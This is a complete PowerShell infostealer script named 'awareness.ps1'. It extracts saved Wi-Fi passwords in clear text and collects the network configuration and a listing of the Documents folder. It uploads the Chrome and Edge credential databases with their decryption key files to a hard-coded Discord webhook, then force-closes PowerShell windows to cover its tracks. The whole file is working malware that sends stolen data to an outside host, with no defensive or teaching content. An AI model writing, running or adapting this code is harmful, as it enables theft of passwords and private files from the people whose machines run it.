# Supporting PowerShell Script: awareness.ps1

# Define Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1310574631249248297/uINhiPCPEfFgH3NlZ_ioU1tAtGMwYJXfxND5yc-iSrb_a_TAR46kPq6WhTRWZY0r_qdj"

# Function to send text content to Discord
function Send-PayloadToDiscord {
    param (
        [string]$content
    )
    try {
        Add-Type -AssemblyName "System.Net.Http"
        $client = New-Object System.Net.Http.HttpClient
        $payload = @{ "content" = $content } | ConvertTo-Json -Depth 10
        $contentObj = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
        $client.PostAsync($webhookUrl, $contentObj).Result
    } catch {
        Write-Host "Failed to send payload: $_"
    }
}

# Function to send files to Discord
function Send-FileToDiscord {
    param (
        [string]$filePath,
        [string]$fileName
    )
    try {
        Add-Type -AssemblyName "System.Net.Http"
        $client = New-Object System.Net.Http.HttpClient
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
        $multipartContent.Add($fileContent, "file", $fileName)
        $client.PostAsync($webhookUrl, $multipartContent).Result
        $fileStream.Close()
    } catch {
        Write-Host "Failed to send file: $_"
    }
}

# Extract Wi-Fi Credentials
try {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    $results = "Wi-Fi Credentials:`n"
    foreach ($profile in $wifiProfiles) {
        $keyContent = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\s+:\s+(.*)$"
        if ($keyContent) {
            $results += "${profile}: $($keyContent.Matches.Groups[1].Value)`n"
        } else {
            $results += "${profile}: No password found`n"
        }
    }
    Send-PayloadToDiscord -content $results
} catch {
    Write-Host "Error extracting Wi-Fi credentials: $_"
    Send-PayloadToDiscord -content "Error extracting Wi-Fi credentials: $_"
}

# Extract Network Configuration
try {
    $netConfig = Get-NetIPAddress | Out-String
    Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
} catch {
    Write-Host "Error extracting network configuration: $_"
    Send-PayloadToDiscord -content "Error extracting network configuration: $_"
}

# Extract Browser Saved Credentials (Chrome and Edge)
try {
    $browsers = @("Google\\Chrome", "Microsoft\\Edge")
    foreach ($browser in $browsers) {
        $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
        $localState = "$env:LOCALAPPDATA\$browser\User Data\Local State"
        if (Test-Path $loginData -and Test-Path $localState) {
            Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
            Send-FileToDiscord -filePath $localState -fileName "$browser_LocalState"
            Send-PayloadToDiscord -content "Browser: $browser - Login Data and Local State files uploaded."
        }
    }
} catch {
    Write-Host "Error extracting browser credentials: $_"
    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
}

# List Files in My Documents
try {
    $myDocs = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse | Select-Object FullName, Length, LastWriteTime | Out-String
    Send-PayloadToDiscord -content "Files in My Documents:`n$myDocs"
} catch {
    Write-Host "Error listing My Documents: $_"
    Send-PayloadToDiscord -content "Error listing My Documents: $_"
}

# Close PowerShell Windows
try {
    Stop-Process -Name "powershell" -Force
} catch {
    Write-Host "Error closing PowerShell: $_"
}
